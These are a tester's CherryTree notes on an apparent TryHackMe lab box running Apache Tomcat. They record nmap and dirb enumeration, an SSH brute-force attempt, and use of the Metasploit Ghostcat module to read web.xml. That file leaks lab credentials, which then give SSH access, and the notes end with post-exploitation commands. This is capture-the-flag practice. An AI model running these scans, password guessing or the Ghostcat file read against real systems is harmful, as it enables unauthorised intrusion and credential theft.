@@ -1,0 +1,358 @@
+<?xml version="1.0" encoding="UTF-8"?>
+<cherrytree>
+  <bookmarks list=""/>
+  <node name="Reconnaissance" unique_id="5" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1704873212" ts_lastsave="1704877775">
+    <rich_text>
+
+</rich_text>
+    <codebox char_offset="0" justification="left" frame_width="1239" frame_height="100" width_in_pixels="1" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="1">┌──(kali㉿kali)-[~]
+└─$ sudo nmap -sV -T5 -p- 10.10.48.213
+Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-01-10 02:51 EST
+Warning: 10.10.48.213 giving up on port because retransmission cap hit (2).
+Nmap scan report for 10.10.48.213
+Host is up (0.050s latency).
+Not shown: 65531 closed tcp ports (reset)
+PORT     STATE SERVICE    VERSION
+22/tcp   open  ssh        OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
+53/tcp   open  tcpwrapped
+8009/tcp open  ajp13      Apache Jserv (Protocol v1.3)
+8080/tcp open  http       Apache Tomcat 9.0.30
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 77.74 seconds
+
+
+┌──(kali㉿kali)-[~]
+└─$ dirb http://10.10.48.213:8080/ /usr/share/wordlists/seclists/Discovery/Web-Content/ApacheTomcat.fuzz.txt 
+
+-----------------
+DIRB v2.22    
+By The Dark Raver
+-----------------
+
+START_TIME: Wed Jan 10 02:58:20 2024
+URL_BASE: http://10.10.48.213:8080/
+WORDLIST_FILES: /usr/share/wordlists/seclists/Discovery/Web-Content/ApacheTomcat.fuzz.txt
+
+-----------------
+
+GENERATED WORDS: 53                                                            
+
+---- Scanning URL: http://10.10.48.213:8080/ ----
++ http://10.10.48.213:8080/examples (CODE:302|SIZE:0)                                                              
++ http://10.10.48.213:8080/examples/jsp/index.html (CODE:200|SIZE:14245)                                           
++ http://10.10.48.213:8080/examples/jsp/snp/snoop.jsp (CODE:200|SIZE:618)                                          
++ http://10.10.48.213:8080/examples/servlets/index.html (CODE:200|SIZE:6596)                                       
++ http://10.10.48.213:8080/manager (CODE:302|SIZE:0)                                                               
++ http://10.10.48.213:8080/RELEASE-NOTES.txt (CODE:200|SIZE:6898)                                                  
+                                                                               
+-----------------
+END_TIME: Wed Jan 10 02:58:24 2024
+DOWNLOADED: 53 - FOUND: 6
+
+
+┌──(kali㉿kali)-[~]
+└─$ sudo nmap --script=ssh* -p22 10.10.48.213  
+Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-01-10 02:54 EST
+NSE: [ssh-run] Failed to specify credentials and command to run.
+NSE: [ssh-brute] Trying username/password pair: root:root
+NSE: [ssh-brute] Trying username/password pair: admin:admin
+NSE: [ssh-brute] Trying username/password pair: administrator:administrator
+NSE: [ssh-brute] Trying username/password pair: webadmin:webadmin
+NSE: [ssh-brute] Trying username/password pair: sysadmin:sysadmin
+NSE: [ssh-brute] Trying username/password pair: netadmin:netadmin
+...........
+...........
+...........
+NSE: [ssh-brute] Trying username/password pair: sysadmin:flowers
+NSE: [ssh-brute] Trying username/password pair: netadmin:flowers
+NSE: [ssh-brute] Trying username/password pair: guest:flowers
+NSE: [ssh-brute] Trying username/password pair: user:flowers
+NSE: [ssh-brute] Trying username/password pair: web:flowers
+NSE: [ssh-brute] usernames: Time limit 10m00s exceeded.
+NSE: [ssh-brute] usernames: Time limit 10m00s exceeded.
+NSE: [ssh-brute] passwords: Time limit 10m00s exceeded.
+Nmap scan report for 10.10.48.213
+Host is up (0.066s latency).
+
+PORT   STATE SERVICE
+22/tcp open  ssh
+| ssh2-enum-algos: 
+|   kex_algorithms: (6)
+|       curve25519-sha256@libssh.org
+|       ecdh-sha2-nistp256
+|       ecdh-sha2-nistp384
+|       ecdh-sha2-nistp521
+|       diffie-hellman-group-exchange-sha256
+|       diffie-hellman-group14-sha1
+|   server_host_key_algorithms: (5)
+|       ssh-rsa
+|       rsa-sha2-512
+|       rsa-sha2-256
+|       ecdsa-sha2-nistp256
+|       ssh-ed25519
+|   encryption_algorithms: (6)
+|       chacha20-poly1305@openssh.com
+|       aes128-ctr
+|       aes192-ctr
+|       aes256-ctr
+|       aes128-gcm@openssh.com
+|       aes256-gcm@openssh.com
+|   mac_algorithms: (10)
+|       umac-64-etm@openssh.com
+|       umac-128-etm@openssh.com
+|       hmac-sha2-256-etm@openssh.com
+|       hmac-sha2-512-etm@openssh.com
+|       hmac-sha1-etm@openssh.com
+|       umac-64@openssh.com
+|       umac-128@openssh.com
+|       hmac-sha2-256
+|       hmac-sha2-512
+|       hmac-sha1
+|   compression_algorithms: (2)
+|       none
+|_      zlib@openssh.com
+| ssh-publickey-acceptance: 
+|_  Accepted Public Keys: No public keys accepted
+| ssh-hostkey: 
+|   2048 f3:c8:9f:0b:6a:c5:fe:95:54:0b:e9:e3:ba:93:db:7c (RSA)
+|   256 dd:1a:09:f5:99:63:a3:43:0d:2d:90:d8:e3:e1:1f:b9 (ECDSA)
+|_  256 48:d1:30:1b:38:6c:c6:53:ea:30:81:80:5d:0c:f1:05 (ED25519)
+| ssh-brute: 
+|   Accounts: No valid accounts found
+|_  Statistics: Performed 3149 guesses in 602 seconds, average tps: 5.3
+|_ssh-run: Failed to specify credentials and command to run.
+| ssh-auth-methods: 
+|   Supported authentication methods: 
+|     publickey
+|_    password
+
+Nmap done: 1 IP address (1 host up) scanned in 602.71 seconds
+
+
+┌──(kali㉿kali)-[~]
+└─$ nmap -sV --script ajp-auth,ajp-headers,ajp-methods,ajp-request -n -p 8009 10.10.48.213
+Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-01-10 03:14 EST
+Nmap scan report for 10.10.48.213
+Host is up (0.036s latency).
+
+PORT     STATE SERVICE VERSION
+8009/tcp open  ajp13   Apache Jserv (Protocol v1.3)
+| ajp-methods: 
+|_  Supported methods: GET HEAD POST OPTIONS
+| ajp-request: 
+| AJP/1.3 200 200
+| Content-Type: text/html;charset=UTF-8
+| 
+| tps://tomcat.apache.org/taglibs/"&gt;Taglibs&lt;/a&gt;&lt;/li&gt;
+|                             &lt;li&gt;&lt;a href="/docs/deployer-howto.html"&gt;Deployer&lt;/a&gt;&lt;/li&gt;
+|                         &lt;/ul&gt;
+|                     &lt;/div&gt;
+|                 &lt;/div&gt;
+|                 &lt;div class="col20"&gt;
+|                     &lt;div class="container"&gt;
+|                         &lt;h4&gt;Other Documentation&lt;/h4&gt;
+|                         &lt;ul&gt;
+|                             &lt;li&gt;&lt;a href="https://tomcat.apache.org/connectors-doc/"&gt;Tomcat Connectors&lt;/a&gt;&lt;/li&gt;
+|                             &lt;li&gt;&lt;a href="https://tomcat.apache.org/connectors-doc/"&gt;mod_jk Documentation&lt;/a&gt;&lt;/li&gt;
+|                             &lt;li&gt;&lt;a href="https://tomcat.apache.org/native-doc/"&gt;Tomcat Native&lt;/a&gt;&lt;/li&gt;
+|                             &lt;li&gt;&lt;a href="/docs/deployer-howto.html"&gt;Deployer&lt;/a&gt;&lt;/li&gt;
+|                         &lt;/ul&gt;
+|                     &lt;/div&gt;
+|                 &lt;/div&gt;
+|                 &lt;div class="col20"&gt;
+|                     &lt;div class="container"&gt;
+|                         &lt;h4&gt;Get Involved&lt;/h4&gt;
+|                         &lt;ul&gt;
+|                             &lt;li&gt;&lt;a href="https://tomcat.apache.org/getinvolved.html"&gt;Overview&lt;/a&gt;&lt;/li&gt;
+|                             &lt;li&gt;&lt;a href="https://tomcat.apache.org/source.html"&gt;Source Repositories&lt;/a&gt;&lt;/li&gt;
+|                             &lt;li&gt;&lt;a href="https://tomcat.apache.org/lists.html"&gt;Mailing Lists&lt;/a&gt;&lt;/li&gt;
+|                             &lt;li&gt;&lt;a href="https://wiki.apache.org/tomcat/FrontPage"&gt;Wiki&lt;/a&gt;&lt;/li&gt;
+|                         &lt;/ul&gt;
+|                     &lt;/div&gt;
+|                 &lt;/div&gt;
+|                 &lt;div class="col20"&gt;
+|                     &lt;div class="container"&gt;
+|                         &lt;h4&gt;Miscellaneous&lt;/h4&gt;
+|                         &lt;ul&gt;
+|                             &lt;li&gt;&lt;a href="https://tomcat.apache.org/contact.html"&gt;Contact&lt;/a&gt;&lt;/li&gt;
+|                             &lt;li&gt;&lt;a href="https://tomcat.apache.org/legal.html"&gt;Legal&lt;/a&gt;&lt;/li&gt;
+|                             &lt;li&gt;&lt;a href="https://www.apache.org/foundation/sponsorship.html"&gt;Sponsorship&lt;/a&gt;&lt;/li&gt;
+|                             &lt;li&gt;&lt;a href="https://www.apache.org/foundation/thanks.html"&gt;Thanks&lt;/a&gt;&lt;/li&gt;
+|                         &lt;/ul&gt;
+|                     &lt;/div&gt;
+|                 &lt;/div&gt;
+|                 &lt;div class="col20"&gt;
+|                     &lt;div class="container"&gt;
+|                         &lt;h4&gt;Apache Software Foundation&lt;/h4&gt;
+|                         &lt;ul&gt;
+|                             &lt;li&gt;&lt;a href="https://tomcat.apache.org/whoweare.html"&gt;Who We Are&lt;/a&gt;&lt;/li&gt;
+|                             &lt;li&gt;&lt;a href="https://tomcat.apache.org/heritage.html"&gt;Heritage&lt;/a&gt;&lt;/li&gt;
+|                             &lt;li&gt;&lt;a href="https://www.apache.org"&gt;Apache Home&lt;/a&gt;&lt;/li&gt;
+|                             &lt;li&gt;&lt;a href="https://tomcat.apache.org/resources.html"&gt;Resources&lt;/a&gt;&lt;/li&gt;
+|                         &lt;/ul&gt;
+|                     &lt;/div&gt;
+|                 &lt;/div&gt;
+|                 &lt;br class="separator" /&gt;
+|             &lt;/div&gt;
+|             &lt;p class="copyright"&gt;Copyright &amp;copy;1999-2024 Apache Software Foundation.  All Rights Reserved&lt;/p&gt;
+|         &lt;/div&gt;
+|     &lt;/body&gt;
+| 
+|_&lt;/html&gt;
+| ajp-headers: 
+|_  Content-Type: text/html;charset=UTF-8
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 7.33 seconds
+
+┌──(kali㉿kali)-[~]
+└─$ sudo nmap -p 8009 10.10.48.213 --script ajp-brute
+Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-01-10 03:37 EST
+Nmap scan report for 10.10.48.213
+Host is up (0.045s latency).
+
+PORT     STATE SERVICE
+8009/tcp open  ajp13
+| ajp-brute: 
+|_  URL does not require authentication
+
+Nmap done: 1 IP address (1 host up) scanned in 0.65 seconds
+                             
+                             
+                             
+                             skyfuck@ubuntu:~$ sudo -l
+[sudo] password for skyfuck: 
+Sorry, user skyfuck may not run sudo on ubuntu.
+skyfuck@ubuntu:~$ cat /etc/resolv.conf
+nameserver 8.8.8.8
+skyfuck@ubuntu:~$ cat /etc/hosts
+127.0.0.1       localhost
+127.0.1.1       ubuntu
+
+# The following lines are desirable for IPv6 capable hosts
+::1     localhost ip6-localhost ip6-loopback
+ff02::1 ip6-allnodes
+ff02::2 ip6-allrouters
+
+                                </codebox>
+    <node name="Checking Webapplication Content" unique_id="6" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1704873618" ts_lastsave="1704873618"/>
+  </node>
+  <node name="Possible Vulnerabilities" unique_id="2" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1704872924" ts_lastsave="1704877224">
+    <rich_text link="webs https://www.exploit-db.com/exploits/49039:">https://www.exploit-db.com/exploits/49039:</rich_text>
+    <rich_text>
+
+
+</rich_text>
+    <rich_text scale="h1">Apache Tomcat - AJP 'Ghostcat' File Read/Inclusion (Metasploit)                             </rich_text>
+    <rich_text>
+
+msf6 &gt; search name:ajp
+
+Matching Modules
+================
+
+   #  Name                                                 Disclosure Date  Rank       Check  Description
+   -  ----                                                 ---------------  ----       -----  -----------
+   0  auxiliary/admin/http/tomcat_ghostcat                 2020-02-20       normal     Yes    Apache Tomcat AJP File Read
+   1  exploit/linux/http/f5_bigip_tmui_rce_cve_2023_46747  2023-10-26       excellent  Yes    F5 BIG-IP TMUI AJP Smuggling RCE
+
+
+Interact with a module by name or index. For example info 1, use 1 or use exploit/linux/http/f5_bigip_tmui_rce_cve_2023_46747                                                                                                           
+
+msf6 &gt; use 0
+msf6 auxiliary(admin/http/tomcat_ghostcat) &gt; show options
+
+Module options (auxiliary/admin/http/tomcat_ghostcat):
+
+   Name      Current Setting   Required  Description
+   ----      ---------------   --------  -----------
+   FILENAME  /WEB-INF/web.xml  yes       File name
+   RHOSTS                      yes       The target host(s), see </rich_text>
+    <rich_text link="webs https://docs.metasploit.com/docs/using-metasploit">https://docs.metasploit.com/docs/using-metasploit</rich_text>
+    <rich_text>
+                                         /basics/using-metasploit.html
+   RPORT     8009              yes       The Apache JServ Protocol (AJP) port (TCP)
+
+
+View the full module info with the info, or info -d command.
+
+msf6 auxiliary(admin/http/tomcat_ghostcat) &gt; set RHOSTS 10.10.48.213
+RHOSTS =&gt; 10.10.48.213
+msf6 auxiliary(admin/http/tomcat_ghostcat) &gt; check
+[*] 10.10.48.213:8009 - The target appears to be vulnerable. Successfully read file /WEB-INF/web.xml
+msf6 auxiliary(admin/http/tomcat_ghostcat) &gt; run
+[*] Running module against 10.10.48.213
+&lt;?xml version="1.0" encoding="UTF-8"?&gt;
+&lt;!--
+ Licensed to the Apache Software Foundation (ASF) under one or more
+  contributor license agreements.  See the NOTICE file distributed with
+  this work for additional information regarding copyright ownership.
+  The ASF licenses this file to You under the Apache License, Version 2.0
+  (the "License"); you may not use this file except in compliance with
+  the License.  You may obtain a copy of the License at
+
+      </rich_text>
+    <rich_text link="webs http://www.apache.org/licenses/LICENSE-2.0">http://www.apache.org/licenses/LICENSE-2.0</rich_text>
+    <rich_text>
+
+  Unless required by applicable law or agreed to in writing, software
+  distributed under the License is distributed on an "AS IS" BASIS,
+  WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
+  See the License for the specific language governing permissions and
+  limitations under the License.
+--&gt;
+&lt;web-app xmlns="</rich_text>
+    <rich_text link="webs http://xmlns.jcp.org/xml/ns/javaee">http://xmlns.jcp.org/xml/ns/javaee</rich_text>
+    <rich_text>"
+  xmlns:xsi="</rich_text>
+    <rich_text link="webs http://www.w3.org/2001/XMLSchema-instance">http://www.w3.org/2001/XMLSchema-instance</rich_text>
+    <rich_text>"
+  xsi:schemaLocation="</rich_text>
+    <rich_text link="webs http://xmlns.jcp.org/xml/ns/javaee">http://xmlns.jcp.org/xml/ns/javaee</rich_text>
+    <rich_text>
+                      </rich_text>
+    <rich_text link="webs http://xmlns.jcp.org/xml/ns/javaee/web-app_4_0.xsd">http://xmlns.jcp.org/xml/ns/javaee/web-app_4_0.xsd</rich_text>
+    <rich_text>"
+  version="4.0"
+  metadata-complete="true"&gt;
+
+  &lt;display-name&gt;Welcome to Tomcat&lt;/display-name&gt;
+  &lt;description&gt;
+     Welcome to GhostCat
+        skyfuck:8730281lkjlkjdqlksalks
+  &lt;/description&gt;
+
+&lt;/web-app&gt;
+
+[+] 10.10.48.213:8009 - File contents save to: /home/kali/.msf4/loot/20240110034703_default_10.10.48.213_WEBINFweb.xml_146210.txt
+[*] Auxiliary module execution completed
+msf6 auxiliary(admin/http/tomcat_ghostcat) &gt; 
+
+Maybe the content of the description-tag contains credentials. Checking ssh:
+
+Bingo :)
+
+</rich_text>
+    <codebox char_offset="3422" justification="left" frame_width="1239" frame_height="100" width_in_pixels="1" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="1">skyfuck@ubuntu:~$ id
+uid=1002(skyfuck) gid=1002(skyfuck) groups=1002(skyfuck)
+skyfuck@ubuntu:~$ whoami
+skyfuck
+skyfuck@ubuntu:~$ pwd
+/home/skyfuck
+skyfuck@ubuntu:~$ uname -a
+Linux ubuntu 4.4.0-174-generic #204-Ubuntu SMP Wed Jan 29 06:41:01 UTC 2020 x86_64 x86_64 x86_64 GNU/Linux
+
+skyfuck@ubuntu:/etc$ find / -name user.txt 2&gt;/dev/null
+/home/merlin/user.txt
+
+skyfuck@ubuntu:/etc$ cat /etc/passwd | grep /bin/bash
+root:x:0:0:root:/root:/bin/bash
+merlin:x:1000:1000:zrimga,,,:/home/merlin:/bin/bash
+skyfuck:x:1002:1002:tryhackme TRIAL PoC,3871289312,2931923021,2391293912,2031201201:/home/skyfuck:/bin/bash
+
+</codebox>
+  </node>
+  <node name="Gaining Access" unique_id="4" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1704873002" ts_lastsave="1704873002"/>
+</cherrytree>
